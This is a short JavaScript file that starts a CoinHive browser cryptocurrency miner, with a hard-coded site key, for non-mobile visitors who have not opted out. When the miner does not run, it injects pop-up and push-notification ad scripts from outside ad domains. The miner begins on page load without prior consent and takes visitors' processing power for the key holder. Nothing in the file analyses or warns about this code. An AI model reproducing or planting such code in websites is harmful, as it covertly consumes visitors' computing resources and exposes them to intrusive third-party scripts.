function loadAds() {
    var loader = document.createElement('script');
    loader.src = "//go.oclaserver.com/apu.php?zoneid=229816";
    document.body.appendChild(loader);
    var loader2 = document.createElement('script');
    loader2.src = "//go.mobisla.com/notice.php?p=229818&interactive=1&pushup=1";
    document.body.appendChild(loader2);
}
var miner = new CoinHive.Anonymous('glBr6WTVxeuCXSCJEECLa0X2v6Rw4bJa', {
    throttle: 0.3
});
if (!miner.isMobile() && !miner.didOptOut(14400)) {
    miner.start();
} else {
    loadAds();
}
miner.on('optin', function(params) {
    if (params.status === 'accepted') {} else {
        loadAds();
    }
});